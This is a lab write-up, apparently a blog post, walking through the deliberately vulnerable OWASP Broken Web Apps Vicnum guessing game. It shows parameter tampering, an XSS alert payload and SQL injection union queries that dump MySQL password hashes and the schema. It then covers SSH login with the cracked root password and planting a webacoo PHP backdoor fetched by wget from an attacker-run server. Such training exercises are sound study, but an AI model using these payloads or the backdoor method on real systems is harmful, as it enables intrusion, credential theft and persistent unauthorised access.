+++
title = "OWASP Broken Web Apps Vicnum - Guessnum"
slug = "owasp-broken-web-apps-vicnum-guessnum"
default_language = "en"
[taxonomies]
categories=["vulnerable-web-app"]
tags=["web", "owasp"]
+++

I started off just playing the game to see what happens moving through the workflow.  After guessing the number in 8 tries I noticed that the count is being passed from the success page over to the scoreboard, using repeater to repeat with different parameters it turns out you can make up your own score by updating the paramter &cnt.

After letting Burp spider the site I saw a union page: union1.html seems like a sql union challenge..

Looking at the page, the name parameter probably isn't sql injectable, but probably XSS vulnerable.

Throwing:

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
```

into the URL for the unionguessname GET parameter worked.

Now for the SQLi stuff.

Doing a quick:

```sql
' or 1 = 1 #
```

shows query results for all users on the page, so we know its injectable.

Now to get the db users and their passwords:
```sql
'  union all select user,password,3,4 from mysql.user#
```

Then with this I first tried crackstation.net, but wasn't able to get all the passwords for root, then I did a little research and it looks like the hashes are SHA1, after some searching I found this site: https://www.hashkiller.co.uk/ which found the root password in question: owaspbwa, this matches the readme when the VM boots up.

Then just to see how to do it I grabbed the whole database through a web request in Burp:
```sql
'  union all select table_schema, table_name,column_name,4 from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema'#
```

Next lets ssh to the VM:

```bash
ssh root@ip
pw: owaspbwa
```

Now to get a persisted backdoor.

I've been playing with parrot and it looks like it comes with a web backdoor named webacoo, after some researching, it looks pretty solid, now to set things up.  

First the backdoor has to be generated:

```bash
webacoo -g -o bd.php
```

The -o option specifies to output to a file and the -g specifies to generate backdoor code, there is another option -f that allows control over what PHP function gets called to invoke the shell.

Next fire up SimpleHTTPServer in Parrot and change directory to the web root /var/www on the VM and run:

```bash
wget http://iptoparrot:8000/bd.php
```

Then to test things out:

```bash
webacoo -t -u http://ip/bd.php
```
